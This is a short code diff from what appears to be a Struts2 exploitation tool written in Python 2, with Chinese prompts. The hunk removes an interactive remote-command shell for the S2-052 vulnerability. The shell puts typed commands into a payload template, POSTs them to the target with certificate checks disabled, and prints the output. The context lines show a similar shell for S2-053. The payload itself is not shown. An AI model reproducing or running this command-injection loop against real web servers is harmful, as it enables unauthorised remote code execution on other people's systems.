@@ -407,27 +407,6 @@ class struts_baseverify:
                 else:
                     sys.exit(1)
 
-        if pocname == "struts2-052":
-            while True:
-                print prompt,
-                command = raw_input()
-                command = command.strip()
-                if command != "exit":
-                    try:
-                        req = requests.post(self.url, data=self.shell['struts2-052'].replace("FUZZINGCOMMAND", command), headers=headers_052, timeout=6, verify=False)
-                        print req.text
-                        #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        #sock.connect((host, int(port)))
-                        #sock.send(command)
-                        #res = sock.recv(65535)
-                        #print res
-                        #sock.close()
-
-                    except:
-                        cprint("命令执行失败!!!", "red")
-                else:
-                    sys.exit(1)
-
         if pocname == "struts2-053":
             param = raw_input("请指定struts2-053参数: ")
             while True:
